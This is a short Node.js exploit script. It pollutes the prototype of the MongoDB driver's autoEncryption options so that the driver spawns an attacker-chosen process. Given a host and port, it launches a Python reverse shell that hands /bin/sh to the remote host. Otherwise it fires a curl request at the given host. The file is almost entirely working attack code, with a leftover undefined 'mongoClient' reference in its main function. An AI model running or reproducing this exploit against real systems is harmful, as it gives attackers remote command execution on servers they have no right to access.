const { MongoClient } = require('mongodb');
const crypto = require('crypto');
 
const localMasterKey = crypto.randomBytes(96);
const autoEncryption = {keyVaultNamespace: 'admin.datakeys', kmsProviders: {local: {key: localMasterKey}}};

const lhost = process.argv[2];
const lport = process.argv[3];
if (lport) {
        console.log(`Reverse shell sent to ${lhost}:${lport}`);
        autoEncryption.__proto__.mongocryptdSpawnPath = "python3";
        autoEncryption.__proto__.mongocryptdSpawnArgs = ['-c', `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`];
} else {
        console.log(`HTTP request made to ${lhost}`);
        autoEncryption.__proto__.mongocryptdSpawnPath = "curl";
        autoEncryption.__proto__.mongocryptdSpawnArgs = [lhost, "-d"];
}

const URL = 'mongodb://localhost:27017';
const client = new MongoClient(URL, { autoEncryption, useUnifiedTopology: true });
main(); 

async function main() {
  try {
    await client.connect();
    const db = mongoClient.db('test');
    await db.dropCollection('coll');
    const collection = db.collection('coll');
    await collection.insertOne({ encryptedField: '123456789' });
    const result = await collection.findOne({});
    console.log(result);
  } finally {
    await client.close();
  }
}
